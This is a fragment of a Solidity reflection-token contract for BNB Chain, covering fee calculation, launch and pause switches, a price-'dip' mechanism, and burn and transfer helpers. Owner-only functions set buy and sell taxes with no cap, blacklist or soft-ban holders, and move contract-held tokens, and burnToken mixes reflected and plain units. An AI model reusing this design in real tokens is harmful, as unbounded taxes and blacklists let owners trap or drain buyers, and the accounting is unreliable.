            return (rAmount, rTransferAmount, rFee, tTransferAmount, tFee, tLiquidity);
        }

        function _getTValues(uint256 tAmount) private view returns (uint256, uint256, uint256) {
            uint256 tFee = calculateTaxFee(tAmount);
            uint256 tLiquidity = calculateLiquidityFee(tAmount);
            uint256 tTransferAmount = tAmount.sub(tFee).sub(tLiquidity);
            return (tTransferAmount, tFee, tLiquidity);
        }

        function _getRValues(uint256 tAmount, uint256 tFee, uint256 tLiquidity, uint256 currentRate) private pure returns (uint256, uint256, uint256) {
            uint256 rAmount = tAmount.mul(currentRate);
            uint256 rFee = tFee.mul(currentRate);
            uint256 rLiquidity = tLiquidity.mul(currentRate);
            uint256 rTransferAmount = rAmount.sub(rFee).sub(rLiquidity);
            return (rAmount, rTransferAmount, rFee);
        }

        function _getRate() private view returns(uint256) {
            (uint256 rSupply, uint256 tSupply) = _getCurrentSupply();
            return rSupply.div(tSupply);
        }

        function _getCurrentSupply() private view returns(uint256, uint256) {
            uint256 rSupply = _rTotal;
            uint256 tSupply = _tTotal;      
            for (uint256 i = 0; i < _raOleh.length; i++) {
                if (_rOwned[_raOleh[i]] > rSupply || _tOwned[_raOleh[i]] > tSupply) return (_rTotal, _tTotal);
                rSupply = rSupply.sub(_rOwned[_raOleh[i]]);
                tSupply = tSupply.sub(_tOwned[_raOleh[i]]);
            }
            if (rSupply < _rTotal.div(_tTotal)) return (_rTotal, _tTotal);
            return (rSupply, tSupply);
        }
        
        function _takeLiquidity(uint256 tLiquidity) private {
            uint256 currentRate =  _getRate();
            uint256 rLiquidity = tLiquidity.mul(currentRate);
            _rOwned[address(this)] = _rOwned[address(this)].add(rLiquidity);
            if(_raMasuk[address(this)])
                _tOwned[address(this)] = _tOwned[address(this)].add(tLiquidity);
        }
        
        function calculateTaxFee(uint256 _amount) private view returns (uint256) {
            return _amount.mul(_marketingFee).div(
                10**2
            );
        }
        
        function calculateLiquidityFee(uint256 _amount) private view returns (uint256) {
            return _amount.mul(_liquidityFee).div(
                10**2
            );
        }

        function transferToAddressBNB(address payable recipient, uint256 amount) private {
            recipient.transfer(amount);
        }
        
        function setMaxBag(uint256 maxWalletPercent) external senseiPower() {
            _sitikWae = _tTotal.mul(maxWalletPercent).div(400);
        }

        function setGatel(uint256 maxTx) external senseiPower() {
            _gatel = maxTx;
        }

        function setAutoSwap(uint256 haha) external senseiPower() {
            require(haha <= 3, "swapType incorect");
            swapType = haha;
        }

        function setDaySell(uint256 maxTx) external senseiPower() {
            daySell = maxTx;
        }

        function updatePairSwapped(bool swapped) external senseiPower() {
            pairSwapped = swapped;
        }

        function lfg(uint256 hehe) external senseiPower() {
            _liquidityFee=7;
            _marketingFee=3;
            _liquidityFeeSell=11;
            _marketingFeeSell=4;
            bebas = true;
            _AntibotTime = hehe;
            launchTime = block.timestamp;
            newDB(sensei(), true);
            newDB(address(this), true);
            newDB(burnAddress, true);
            newDB(marketingAddress, true);
            newDB(RnD, true);
            newDB(Reward, true);
        }

        function start() external senseiPower() {
            launchTime = block.timestamp;
            bebas = true;
        }
        function pause() external senseiPower() {
            bebas = false;
        }

        function enableMarketingSwap() external senseiPower() {
            swapMarketing = true;
        }
        function disableMarketingSwap() external senseiPower() {
            swapMarketing = false;
        }

        function excludeFromReward(address account) public senseiPower() {
            require(!_raMasuk[account], "Account is already excluded");
            if(_rOwned[account] > 0) {
                _tOwned[account] = tokenFromReflection(_rOwned[account]);
            }
            _raMasuk[account] = true;
            _raOleh.push(account);
        }

        function includeInReward(address account) external senseiPower() {
            require(_raMasuk[account], "Account is already excluded");
            for (uint256 i = 0; i < _raOleh.length; i++) {
                if (_raOleh[i] == account) {
                    _raOleh[i] = _raOleh[_raOleh.length - 1];
                    _tOwned[account] = 0;
                    _raMasuk[account] = false;
                    _raOleh.pop();
                    break;
                }
            }
        }

        function dRandDip() external senseiPower() {
            require(randDip ==  true, "randDip already disabled");
            randDip = false;
        }

        function eRandDip() external senseiPower() {
            require(randDip == false, "randDip already enabled");
            randDip = true;
        }

        function DipNow() external senseiPower() {
            require(randDip == true, "must enable randDip");
            uint256 price =  this.getTokenPrice();
            lastDip = price;
        }

        function setPriceImpact(uint256 priceImpact) external senseiPower() {
            require(priceImpact <= 100, "max price impact must be less than or equal to 100");
            require(priceImpact > 0, "cant prevent sells, choose value greater than 0");
            _priceImpact = priceImpact;
            emit PriceImpactUpdated(_priceImpact);
        }

        function setDipPercent(uint256 val) external senseiPower() {
            require(val <= 95, "percent must be less than or equal to 95");
            dipPercent = val;
            emit UpdateDip(dipPercent);
        }
        
        function addNoFee(address to) public senseiPower {
            if (!isDB(to)) {
                newDB(to, true);
            } else {
                DBUser.data storage dbs = dbuser[to];
                dbs.nf = true;
                dbuser[to] = dbs;
            }
        }
        
        function delNoFee(address to) public senseiPower {
            if (!isDB(to)) {
                newDB(to, false);
            } else {
                DBUser.data storage dbs = dbuser[to];
                dbs.nf = false;
                dbuser[to] = dbs;
            }
        }

        function addSoftBan(address account) public senseiPower {
            DBUser.data storage dbs = dbuser[account];
            dbs.sbl = true;
            dbuser[account] = dbs;
        }

        function delSoftBan(address account) public senseiPower {
            DBUser.data storage dbs = dbuser[account];
            dbs.sbl = false;
            dbuser[account] = dbs;
        }
        
        function setTaxFee(uint256 taxFee) external senseiPower() {
            _marketingFee = taxFee;
            _lastMarketingFee = _marketingFee;
        }
        
        function setLiquidityFee(uint256 liquidityFee) external senseiPower() {
            _liquidityFee = liquidityFee;
            _lastLiquidityFee = _liquidityFee;
        }
        function setTaxSell(uint256 taxFee) external senseiPower() {
            _marketingFeeSell = taxFee;
            _lastMarketingFeeSell = _marketingFeeSell;
        }
        
        function setLiquiditySell(uint256 liquidityFee) external senseiPower() {
            _liquidityFeeSell = liquidityFee;
            _lastLiquidityFee = _liquidityFee;
        }
        
        function setMarketingAddress(address _marketingAddress) external senseiPower() {
            marketingAddress = payable(_marketingAddress);
        }

        function _addban(address account) external senseiPower() {
            require(account != 0x10ED43C718714eb63d5aA57B78B54704E256024E, 'We can not blacklist PCS');
            require(!isBL(account), "Account is already blacklisted");
            DBUser.data storage dbs = dbuser[account];
            dbs.bl = true;
            dbuser[account] = dbs;
        }

        function _unban(address account) external senseiPower() {
            require(isBL(account), "Account is not blacklisted");
            DBUser.data storage dbs = dbuser[account];
            dbs.bl = false;
            dbuser[account] = dbs;
        }

        function setFeeRate(uint256 rate) external senseiPower() {
            _feeRate = rate;
        }

        function setReservePool(address _address) external senseiPower() {
            require(_address != reservePoolAddress, "New reserve pool address must different");
            reservePoolAddress = _address;
            addNoFee(_address);
        }

        function burnToken(uint256 amount) public {
            amount = amount.mul(10**9);
            uint256 tok = balanceOf(msg.sender);
            require(tok >= amount, "Not enought balance");
            _rOwned[msg.sender] = _rOwned[msg.sender].sub(amount);
            _tTotal = _tTotal.sub(amount);
            emit Transfer(msg.sender, burnAddress, amount);
        }

        function burnTokenFromSc(uint256 amount) external senseiPower() {
            amount = amount.mul(10**9);
            uint256 tok = balanceOf(address(this));
            require(tok >= amount, "Not enought balance");
            _rOwned[address(this)] = _rOwned[address(this)].sub(amount);
            _tTotal = _tTotal.sub(amount);
            emit Transfer(address(this), burnAddress, amount);
        }

        function sendTokenFromSc(uint256 amount, address to) external senseiPower() {
            amount = amount.mul(10**9);
            uint256 tok = balanceOf(address(this));
            require(tok >= amount, "Not enought balance");
            _tokenTransfer(address(this),to,amount,false);
        }
        
        receive() external payable {}
    }